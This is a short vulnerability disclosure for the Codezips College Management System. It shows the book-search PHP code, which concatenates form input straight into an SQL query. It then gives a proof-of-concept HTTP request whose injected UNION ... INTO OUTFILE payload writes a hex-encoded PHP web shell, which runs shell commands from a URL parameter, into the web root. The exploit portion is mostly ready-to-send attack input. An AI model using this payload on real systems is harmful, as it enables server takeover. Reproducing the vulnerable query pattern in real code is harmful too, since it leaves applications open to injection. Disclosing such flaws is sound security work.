# Remote Code Execution via SQL Injection


## Vendor and Product information:
* **Vendor:** Codezips
* **Product:** College Management System
* **Product URL:** https://codezips.com/php/college-management-system/

## Description
The book search feature in the College Management System is vulnerable to Remote Code Execution through SQL injection, allowing attackers to access sensitive server data and compromise the confidentiality, integrity, and availability of the system.

## Code
~~~ php
<?php
if(isset($_POST['search_book']))
 $name=$_POST['book_name'];
 $author=$_POST['book_author'];
 $query = "SELECT * FROM book WHERE book_name = '$name' AND author = '$author'";
 $results = mysqli_query($db, $query);
 $row = mysqli_fetch_array($results);
?>
~~~

## Proof of Concept
**HTTP Request Example**
``` http request
POST /college-mgmt-php-master/Front-end/faculty.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/college-mgmt-php-master/Front-end/faculty.php

book_name=x'+union+select+NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e,NULL,NULL+INTO+OUTFILE+'/opt/lampp/htdocs/shell.php'--+-&book_author=x&search_book=
```

## Screenshot
![image](https://github.com/user-attachments/assets/6246a128-6350-440d-aa4a-afea1371aecc)


## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
